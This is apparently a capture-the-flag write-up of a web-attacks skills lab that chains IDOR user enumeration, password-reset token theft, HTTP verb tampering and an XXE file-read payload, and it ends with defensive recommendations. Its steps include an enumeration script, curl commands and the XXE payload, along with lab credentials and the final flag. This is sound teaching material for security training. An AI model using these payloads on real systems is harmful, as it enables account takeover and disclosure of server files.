# 🎯 Web Attacks - Skills Assessment

> **🎯 Objective:** Comprehensive skills assessment demonstrating attack chaining across multiple web vulnerabilities to achieve privilege escalation and flag extraction.

## Overview

This assessment combines three major attack vectors from the Web Attacks module:
1. **IDOR (Insecure Direct Object References)** - User enumeration and token extraction
2. **HTTP Verb Tampering** - Authorization bypass  
3. **XXE Injection** - Sensitive file disclosure

**Target Goal:** Read the flag at `/flag.php`

---

## Attack Chain Walkthrough

### Phase 1: Initial Access & IDOR Discovery

#### Step 1: Login with Provided Credentials
```bash
# Default credentials for initial access
Username: htb-student
Password: Academy_student!
```

**Methodology:**
1. Open **Network tab** in Developer Tools (F12)
2. Login and monitor HTTP requests
3. Identify API endpoints in network traffic

#### Step 2: Discover IDOR in User API

**API Endpoint Discovered:** `/api.php/user/74`

**Initial Request Analysis:**
```http
GET /api.php/user/74 HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abc123...
```

**Response:**
```json
{
  "uid": "74",
  "username": "htb-student", 
  "full_name": "HTB Student",
  "company": "Student"
}
```

#### Step 3: Test IDOR Vulnerability

**Manual IDOR Testing:**
```bash
# Test different user IDs
curl -H "Cookie: PHPSESSID=abc123..." "http://target.com/api.php/user/75"
curl -H "Cookie: PHPSESSID=abc123..." "http://target.com/api.php/user/1"
```

**Vulnerability Confirmed:** ✅ Returns data for other users without authorization

---

### Phase 2: User Enumeration & Admin Discovery

#### Step 4: Mass User Enumeration

**Automated Enumeration Script:**
```bash
#!/bin/bash
# user-enum.sh - IDOR user enumeration

echo "Enumerating users 1-100..."

for uid in {1..100}; do
    response=$(curl -s -H "Cookie: PHPSESSID=[SESSION]" \
        "http://target.com/api.php/user/$uid")
    
    if [[ $response == *"uid"* ]]; then
        echo "UID $uid: $response"
    fi
done
```

**Execution:**
```bash
chmod +x user-enum.sh
./user-enum.sh | tee users.txt
```

#### Step 5: Identify Administrative Users

**Search for Admin Privileges:**
```bash
# Filter for admin/administrator roles
cat users.txt | grep -i "admin" | jq .

# Expected output:
{
  "uid": "52",
  "username": "a.corrales", 
  "full_name": "Amor Corrales",
  "company": "Administrator"
}
```

**🎯 Target Identified:** User `a.corrales` (UID: 52) has Administrator privileges

---

### Phase 3: Token Extraction via IDOR

#### Step 6: Analyze Password Reset Functionality  

**Discovery Process:**
1. Navigate to **Settings** → **Change Password**
2. Monitor network requests in Developer Tools
3. Identify token retrieval endpoint

**Token API Discovered:** `/api.php/token/74`

**Normal Token Request:**
```http
GET /api.php/token/74 HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abc123...

Response: e51a8a14-17ac-11ec-8e67-a3c050fe0c26
```

#### Step 7: Extract Admin User Token

**IDOR Token Extraction:**
```bash
# Extract token for admin user (UID: 52)
curl -s -H "Cookie: PHPSESSID=[SESSION]" \
    "http://target.com/api.php/token/52"

# Response: e51a85fa-17ac-11ec-8e51-e78234eb7b0c
```

**🔑 Admin Token Obtained:** `e51a85fa-17ac-11ec-8e51-e78234eb7b0c`

---

### Phase 4: HTTP Verb Tampering for Authorization Bypass

#### Step 8: Analyze Password Reset Mechanism

**Reset Password Endpoint:** `/reset.php`

**Normal POST Request Structure:**
```http
POST /reset.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=abc123...

uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=newpass123
```

#### Step 9: Attempt Direct Password Reset (Fails)

**Direct Reset Attempt:**
```bash
curl -X POST "http://target.com/reset.php" \
    -H "Cookie: PHPSESSID=[SESSION]" \
    -d "uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=newpass123"

# Response: "Access Denied"
# Backend checks PHPSESSID against UID
```

#### Step 10: HTTP Verb Tampering Bypass

**Generate Strong Password:**
```bash
# Generate secure password
openssl rand -hex 16
# Output: f0e18de14fdadfc38350d97ff7284a25
```

**Bypass with GET Method:**
```bash
# Convert POST to GET request
curl "http://target.com/reset.php?uid=52&token=e51a85fa-17ac-11ec-8e51-e78234eb7b0c&password=f0e18de14fdadfc38350d97ff7284a25" \
    -H "Cookie: PHPSESSID=[SESSION]"

# Response: "Password Updated Successfully"
```

**✅ Success:** Authorization bypass via HTTP verb tampering

---

### Phase 5: Admin Access & XXE Discovery

#### Step 11: Login as Administrator

**Admin Login:**
```
Username: a.corrales
Password: f0e18de14fdadfc38350d97ff7284a25
```

**New Features Unlocked:** 
- ✅ Administrative dashboard access
- ✅ **"ADD EVENT"** functionality (previously hidden)

#### Step 12: Discover XXE Injection Point

**Event Creation Analysis:**
1. Navigate to **ADD EVENT** functionality
2. Fill form with dummy data
3. Intercept request in Burp Suite/Network tab

**XXE Injection Point Found:**
```http
POST /addEvent.php HTTP/1.1
Host: target.com
Content-Type: application/xml
Cookie: PHPSESSID=admin_session...

<root>
    <name>Test Event</name>
    <details>Test Description</details>
    <date>2021-09-22</date>
</root>
```

**🎯 XML Input Identified:** Application accepts XML data for event creation

---

### Phase 6: XXE File Disclosure

#### Step 13: Craft XXE Payload for Flag Extraction

**XXE Payload Construction:**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>XXE Test</details>
    <date>2021-09-22</date>
</root>
```

**Payload Breakdown:**
- `<!DOCTYPE replace [...]>` - External entity definition
- `php://filter/convert.base64-encode/resource=/flag.php` - PHP filter to avoid XML parsing issues
- `&xxe;` - Entity reference in name field (displayed in response)

#### Step 14: Execute XXE Attack

**Manual Exploitation:**
```bash
# Send XXE payload via curl
curl -X POST "http://target.com/addEvent.php" \
    -H "Content-Type: application/xml" \
    -H "Cookie: PHPSESSID=[ADMIN_SESSION]" \
    -d '<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.php"> ]>
<root>
    <name>&xxe;</name>
    <details>XXE Test</details>
    <date>2021-09-22</date>
</root>'
```

**Response Contains Base64:**
```
PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K
```

#### Step 15: Decode Flag

**Base64 Decoding:**
```bash
echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d

# Output: <?php $flag = "HTB{m4573r_w3b_4774ck3r}"; ?>
```

**🏆 Final Flag:** `HTB{m4573r_w3b_4774ck3r}`

---

## Attack Chain Summary

```mermaid
graph TD
    A[Initial Access<br/>htb-student] --> B[IDOR Discovery<br/>/api.php/user/ID]
    B --> C[User Enumeration<br/>UIDs 1-100]
    C --> D[Admin User Found<br/>a.corrales UID:52]
    D --> E[Token Extraction<br/>/api.php/token/52]
    E --> F[Password Reset Attempt<br/>POST /reset.php]
    F --> G[Authorization Bypass<br/>GET Method]
    G --> H[Admin Access<br/>a.corrales login]
    H --> I[XXE Discovery<br/>/addEvent.php XML]
    I --> J[Flag Extraction<br/>php://filter XXE]
    J --> K[Mission Complete<br/>HTB{m4573r_w3b_4774ck3r}]
```

---

## Key Learning Points

### 1. **IDOR Exploitation Techniques**
- ✅ Sequential ID enumeration (1-100)
- ✅ API endpoint discovery through traffic analysis
- ✅ Multi-step IDOR (user data → tokens)
- ✅ Privilege escalation via user enumeration

### 2. **HTTP Verb Tampering Applications**
- ✅ Authorization bypass (POST → GET conversion)
- ✅ Session-based security control evasion
- ✅ Parameter injection through URL manipulation

### 3. **XXE Injection for File Disclosure**  
- ✅ PHP filter usage for binary/special character handling
- ✅ Entity reference in XML elements
- ✅ Base64 encoding/decoding for file extraction

### 4. **Attack Chaining Methodology**
- ✅ **Reconnaissance** → Traffic analysis and endpoint discovery
- ✅ **Vulnerability Assessment** → Systematic testing across attack vectors
- ✅ **Exploitation** → Combining multiple vulnerabilities for privilege escalation
- ✅ **Post-Exploitation** → Administrative access and sensitive data extraction

---

## Defensive Recommendations

### IDOR Prevention
```php
// Secure implementation with authorization checks
if ($_SESSION['user_id'] != $requested_uid && !is_admin($_SESSION['user_id'])) {
    http_response_code(403);
    die("Access Denied");
}
```

### HTTP Method Restrictions
```apache
# .htaccess - Restrict reset.php to POST only
<Files "reset.php">
    <RequireAll>
        Require method POST
    </RequireAll>
</Files>
```

### XXE Prevention
```php
// Disable external entity loading
libxml_disable_entity_loader(true);

// Or use secure XML parsing
$dom = new DOMDocument();
$dom->resolveExternals = false;
$dom->substituteEntities = false;
```

---

## Tools & Resources

### Automation Scripts
- **User Enumeration:** Custom bash script for IDOR testing
- **Burp Suite:** Request modification and response analysis
- **curl:** Command-line HTTP testing and exploitation

### Detection Techniques
- **Network Traffic Analysis:** Browser Developer Tools
- **Response Pattern Recognition:** Identifying successful vs. failed requests
- **Parameter Manipulation:** Systematic testing of input vectors

**💡 Skills Demonstrated:** This assessment showcases the critical importance of defense-in-depth and proper input validation across all application layers. 